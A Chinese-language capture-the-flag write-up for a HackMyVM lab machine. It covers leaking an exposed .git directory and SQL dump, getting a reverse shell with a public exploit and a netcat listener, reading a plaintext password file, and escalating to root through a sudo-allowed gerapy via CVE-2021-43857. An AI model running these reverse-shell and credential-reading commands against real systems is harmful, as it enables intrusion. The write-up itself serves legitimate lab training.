# University

2025.01.03 https://hackmyvm.eu/machines/machine.php?vm=University

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

发现 http://192.168.5.40:80/.git/ ，拉取信息，但是什么都没看到，只有一个 index 文件，但是能看到之前有的文件名信息:

```
python3 ~/Documents/GitHack/GitHack.py http://192.168.5.40:80/.git/
```

根据上面 git 导出的 index，发现 sql 文件：http://192.168.5.40:80/oas.sql 其中发现了管理员账号：

```
INSERT INTO `t_admin` (`ad_id`, `ad_name`, `ad_pswd`, `ad_eml`) VALUES
('AD00000001', 'admin', 'admin', 'admin@gmail.com'),
('AD00002', 'Dilraj', 'QCoxFrwx', 'dilrajkaur18@gmail.com');
```

但是登陆都不成功。

再次观察 nmap 扫描结果，发现这个源码来自 https://github.com/rskoolrash/Online-Admission-System 先搜索看看有没有现成的 exp：

```
nc -lvnp 8888

python3 50623.py -t 192.168.5.40 -p 80 -L 192.168.5.3 -P 8888
```

得到了反弹的 shell。

进行枚举，得到了 sandra 用户的密码:

```
www-data@university:~/html$ cat /var/www/html/.sandra_secret
Myyogaiseasy
```

切换到该用户后，得到了 user flag：

```
sandra@university:~$ cat user.txt
HMV0948328974325HMV
```

sudo -l 发现：(root) NOPASSWD: /usr/local/bin/gerapy 存在 cve 进行利用，使用这个 exp https://github.com/LongWayHomie/CVE-2021-43857：

```
sudo gerapy init
sudo gerapy migrate
sudo gerapy createsuperuser  # 创建用户名： admin  输入密码：admin  上面exp中默认是用的就是admin:admin
mkdir /home/sandra/projects
sudo gerapy runserver 0.0.0.0:8080
```

执行反弹 shell：

```
python3 cve-2021-43857.py -t 192.168.5.39 -p 8080 -L 192.168.5.3 -P 8888
```

最终得到 root flag：

```
root@university:~# cat root.txt
cat root.txt
HMV1111190877987HMV
```
